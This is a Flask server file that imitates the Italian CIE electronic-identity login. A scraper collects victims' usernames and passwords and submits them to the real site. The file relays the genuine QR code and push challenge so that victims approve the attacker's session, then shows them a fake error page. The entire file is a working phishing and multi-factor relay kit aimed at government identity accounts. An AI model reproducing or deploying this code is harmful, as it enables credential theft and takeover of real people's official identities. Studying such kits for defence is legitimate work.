from flask import Flask, jsonify, redirect, render_template, request, url_for, session
import random
from utils.state import State
import utils.scraping as scraping
from concurrent.futures import ThreadPoolExecutor
import time
import sys

app = Flask(__name__)
app.secret_key = "HPAS"

DEFAULT_TEMPO_MS = 120000  # 2 minutes

qr_expiry_store: dict[str, int] = {}
last_challenge = ""

def get_stored_expiry(challenge: str) -> int|None:
    return qr_expiry_store.get(challenge)

def set_stored_expiry(challenge:str, expiry_ms:int):
    qr_expiry_store[challenge] = expiry_ms

random.seed()

def todo():
    return "<b>TO BE IMPLEMENTED</b>"

state = State()
scraper: scraping.Scraper

# QR code functioning:
# when we press "login with CIE", we get redirected to a login page
# with some parameters, one of them being the challenge. With this
# challenge the website generates the QR code (qr source is @ line
# 490 in login_cie.html). Perhaps the best course of action is to 
# simply do the login and pass that field as argument to login_cie,
# so that it can display the correct QR code

@app.route('/')
def landing_page():
    return render_template('landing_page.html', node = str(random.randrange(1, 7)))

@app.route('/do_login/', methods = ["POST", "GET"])
def do_login():
    """
    When pressing the "entra con CIE" button (@see templates/landing_page.html at line 938), we redirect here, where:
    - we do the exact same with our scraper, retrieving the valid qr code and challenge
    - go to /idp/login/livello2 page with these info as arguments
    """
    elements = scraper.get_cie_page_elements()

    session["challenge"] = elements["challenge"]
    session["qr_str"] = elements["qr_str"]
    session["opId"] = elements["opId"]

    return redirect(url_for(
        'cie_level2',
        opId = session["opId"],             # must show up in url, not needed
        challenge = session["challenge"],   # must show up in url, not needed
        level = 2,
        SPName="https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml",
        SPLogo="https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png",
        value="e1s2"
    ))

# TODO: fix. Use session variables to know if we are ok or not

# idea: we create in session with key the challenge, storing 
# qr and whatnot, then we save challenge as last_challenge and we access
# the session[last_challenge]. In there we keep something like did_login, if true we do not retry.
# We also need to reset url on selenium after

def handle_timer() -> tuple[int, int] :
    server_now_ms = int(time.time() * 1000)
    timer_key: str = session["challenge"]  # pyright: ignore[reportAny]
    stored = get_stored_expiry(timer_key)
    if stored is None:
        # first time for this challenge -> create expiry
        expiry_ms = server_now_ms + DEFAULT_TEMPO_MS
        set_stored_expiry(timer_key, expiry_ms)
    else:
        expiry_ms = int(stored)

    return expiry_ms, server_now_ms

def handle_login(lang: str):
    page = f"cie_login_{lang}.html"
    cur_challenge: str = session["challenge"]  # pyright: ignore[reportAny]

    if qr_expiry_store.get(cur_challenge) is None:
        executor = ThreadPoolExecutor(max_workers=2)
        _ = executor.submit(scraper.qr_approve, 120)

    expiry_ms, server_now_ms = handle_timer()

    return render_template(page,
        qr_str = session["qr_str"],
        challenge = cur_challenge,
        opId = session["opId"],
        expiry_ms=expiry_ms,
        server_now_ms=server_now_ms,
        tempoQR_ms=DEFAULT_TEMPO_MS,
   )

def handle_cie_waiting_push(lang: str):
    page = f"cie_waiting_push_{lang}.html"

    key = f"push_{session['challenge']}"
    if session.get(key) is None:
        session[key] = True
        executor = ThreadPoolExecutor(max_workers=2)
        _ = executor.submit(scraper.approve, 120)

    return render_template(page)

def handle_cie_wrong_credentials(lang: str):
    page = f"cie_wrong_credentials_{lang}.html"

    expiry_ms, server_now_ms = handle_timer()
    return render_template(page,
        qr_str = session["qr_str"],
        challenge = session["challenge"],
        opId = session["opId"],
        expiry_ms=expiry_ms,
        server_now_ms=server_now_ms,
        tempoQR_ms=DEFAULT_TEMPO_MS,
    )

@app.route('/idp/login/livello2/', methods=['GET', 'POST'])
def cie_level2():
    url_challenge = request.values.get("challenge")
    lang = request.values.get("eccLang", "it")
    if url_challenge is not None:
        return handle_login(lang)
    else:
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if username != "" and password != "":
            result = scraper.load_cie_page(username, password)
            if result:
                session["pushsent" + session["challenge"]] = True
                return handle_cie_waiting_push(lang)
        if session.get("pushsent" + session["challenge"]) is not None: # reload of notification page
            return handle_cie_waiting_push(lang)

        return handle_cie_wrong_credentials(lang)

@app.route("/idp/login/livello1e2checkpush")
def check_push():
    # without this, for some reason the result gets cached and so we never show the error page to the user
    print(scraper.push_approved)
    if scraper.push_approved:
        return jsonify({"status": "OK"})
    return jsonify({"status": "WAIT"})

@app.route("/idp/login/livello1e2checkqrcode")
def check_qr():
    # without this, for some reason the result gets cached and so we never show the error page to the user
    print(scraper.qr_approved)
    if scraper.qr_approved:
        return jsonify({"status": "OK"})
    return jsonify({"status": "WAIT"})


# post approval: just show an error page
@app.route("/idp/login/livello1e2postpush")
def cie_push_approved():
    return render_template("cie_error_it.html")

@app.route('/idp/login/livello1e2postqrcode')
def cie_qr_code_approved():
    return render_template("cie_error_it.html")

if __name__ == '__main__':
    argv = sys.argv
    port = 5001
    if len(argv) > 1:
        try:
            port = int(argv[1])
        except ValueError:
            pass
    if len(argv) > 2 and argv[2] == "firefox":
        scraper = scraping.Scraper(False)
    else:
        scraper = scraping.Scraper()

    app.run(debug=True, host='0.0.0.0', port=port, use_reloader = False)
